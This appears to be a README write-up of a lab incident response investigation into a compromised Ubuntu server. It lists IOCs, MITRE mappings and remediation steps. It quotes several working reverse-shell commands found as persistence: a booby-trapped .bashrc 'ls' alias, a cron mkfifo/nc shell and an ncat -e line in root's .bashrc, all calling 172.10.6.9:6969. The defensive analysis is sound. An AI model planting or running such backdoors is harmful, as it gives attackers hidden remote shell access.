# Incident Response Investigation – Compromised Linux Server (Multiple Backdoors)

This repository documents a hands-on Incident Response (IR) investigation involving a compromised Linux server that was isolated from production after multiple persistence mechanisms were discovered. The objective of this investigation was to identify, analyze, and remediate all backdoors before approving the system for safe reintroduction into the environment.

---

## Investigation Scenario

A Linux server was suspected of being compromised after anomalous behavior was detected. The Incident Response team isolated the host and confirmed the presence of **five separate backdoors**. The task was to perform a full investigation, identify all persistence mechanisms, document findings, and determine appropriate remediation steps.

Access was provided using privileged credentials:

- **Username:** giorgio  
- **Privileges:** Root access  
- **Access Method:** Local VM 

---

## Environment Details

- **Operating System:** Ubuntu 20.04.6 LTS
- **User Accounts Investigated:** giorgio, root, nobody
- 📄 **Operating System Discovery**  
  [Operating_System_Discovery.md](Linux-Incident-Response-Notes/Operating_System_Discovery.md)
 

  
<p align="center">
  <img src="https://i.imgur.com/Eu6VVQ8.png" width="80%" alt="March Logs"/>
</p>
---

## Investigation Workflow Overview

- Initial host access and OS identification  
- User home directory analysis  
- Shell configuration file review  
- Scheduled task (cron) inspection  
- Root account persistence analysis  
- System-wide persistence enumeration  
- Backdoor identification and documentation  

---

## Findings

### 1. User Account Investigation – giorgio

#### Suspicious File Discovery

**File Identified**
- **Filename:** `.bad_bash`  
- **Location:** `/home/giorgio/`
- 📄 **User Home Directory Enumeration**  
  [User_Home_Directory_Enumeration.md](Linux-Incident-Response-Notes/User_Home_Directory_Enumeration.md)



**Significance**  
The presence of a hidden file named `.bad_bash` in the user’s home directory is indicative of unauthorized modification. Hidden files with misleading names are commonly used by attackers to store malicious scripts or maintain persistence while avoiding casual detection.

<p align="center">
  <img src="https://i.imgur.com/0uLej3R.png" width="80%" alt="March Logs"/>
</p>
---

#### Malicious Bash Alias Persistence
- 📄 **Shell Configuration Review (.bashrc Abuse)**  
  [Shell_Configuration_Review.md](Linux-Incident-Response-Notes/Shell_Configuration_Review.md)


**Modified `.bashrc` Entry**  
A malicious alias was discovered within the user’s `.bashrc` file:

```bash
ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'

```
<p align="center">
  <img src="https://i.imgur.com/ewxbCBP.png" width="80%" alt="March Logs"/>
</p>

<p align="center">
  <img src="https://i.imgur.com/7bJXXFA.png" width="80%" alt="March Logs"/>
</p>


## 2. Scheduled Task Persistence (giorgio)
- 📄 **Scheduled Task (Cron) Persistence Investigation**  
  [Scheduled_Task_Investigation.md](Linux-Incident-Response-Notes/Scheduled_Task_Investigation.md)

A malicious cron-executed reverse shell was identified:

bash
/usr/bin/rm /tmp/f;
/usr/bin/mkfifo /tmp/f;
/usr/bin/cat /tmp/f | /bin/sh -i 2>&1 | /usr/bin/nc 172.10.6.9 6969 > /tmp/f
Persistence Mechanism: Scheduled task

C2 Address: 172.10.6.9:6969

Impact: Repeated outbound shell access

<p align="center">
  <img src="https://i.imgur.com/likslFb.png" width="80%" alt="March Logs"/>
</p>


## 3. Root Account Investigation
- 📄 **Root Account Persistence Analysis**  
  [Root_Account_Investigation.md](Linux-Incident-Response-Notes/Root_Account_Investigation.md)

Upon switching to the root account, an error message appeared automatically, indicating malicious execution without user interaction.

Observed Error Output

makefile
Copy code
Ncat: TIMEOUT.
Suspicious Command Executed

bash
Copy code
ncat -e /bin/bash 172.10.6.9 6969
Persistence Source

File: /root/.bashrc

Mechanism: Automatic execution of reverse shell on login

Privilege Level: Root (critical severity)

<p align="center">
  <img src="https://i.imgur.com/yHEeQNx.png" width="80%" alt="March Logs"/>
</p>

<p align="center">
  <img src="https://i.imgur.com/AZUBHpb.png" width="80%" alt="March Logs"/>
</p>


## 4. System-Level Persistence
- 📄 **System-Level Persistence via Default Accounts**  
  [System_Level_Persistence.md](Linux-Incident-Response-Notes/System_Level_Persistence.md)

A final persistence mechanism was identified tied to a default Linux account.

Account Name: nobody

Description: Abuse of a default system account commonly present in fresh Linux installs

Risk: Difficult-to-detect persistence leveraging trusted system users

<p align="center">
  <img src="https://i.imgur.com/FFeAT2g.png" width="80%" alt="March Logs"/>
</p>

## Indicators of Compromise (IOCs)
html
Copy code
<h3>Indicators of Compromise (IOCs)</h3>
<ul>
  <li><b>Compromised OS:</b> Ubuntu 20.04.6 LTS</li>
  <li><b>C2 IP Address:</b> 172.10.6.9</li>
  <li><b>C2 Port:</b> 6969</li>
  <li><b>Malicious File:</b> .bad_bash</li>
  <li><b>Compromised User:</b> giorgio</li>
  <li><b>Compromised User:</b> root</li>
  <li><b>Abused System Account:</b> nobody</li>
  <li><b>Persistence Mechanisms:</b> .bashrc modification, cron job, reverse shells</li>
  <li><b>Tools Used:</b> bash, nc, ncat</li>
</ul>

## MITRE ATT&CK Mapping
T1059.004 – Command and Scripting Interpreter: Bash
Malicious shell commands embedded in .bashrc files.

T1547.006 – Boot or Logon Autostart Execution: Bash Profile
Persistence via .bashrc execution on login.

T1053.003 – Scheduled Task / Job: Cron
Reverse shell persistence through scheduled tasks.

T1105 – Ingress Tool Transfer / Command and Control
Active reverse shell connections to attacker infrastructure.

T1078 – Valid Accounts
Abuse of legitimate user and system accounts for persistence.

## Final Assessment & Recommendations
The investigation confirmed a multi-layered compromise involving user-level, root-level, and system-account persistence mechanisms. The attacker demonstrated strong knowledge of Linux internals, leveraging shell configuration files, cron jobs, and trusted accounts to maintain access.

## Recommendations
Immediately rebuild the server from a known-good image

Rotate all credentials associated with the host

Audit all .bashrc, .profile, and cron configurations enterprise-wide

Restrict outbound network connections and monitor unusual ports

Deploy host-based intrusion detection (HIDS) and file integrity monitoring

Conduct a full compromise assessment of adjacent systems

## Case Closure
All identified backdoors were documented and understood. Due to the depth of compromise and multiple persistence layers, system reimaging is strongly recommended over manual cleanup. Findings have been preserved for SOC reporting, detection engineering, and future incident response readiness.

Status: Investigation complete – Host unsafe for return to production without rebuild.



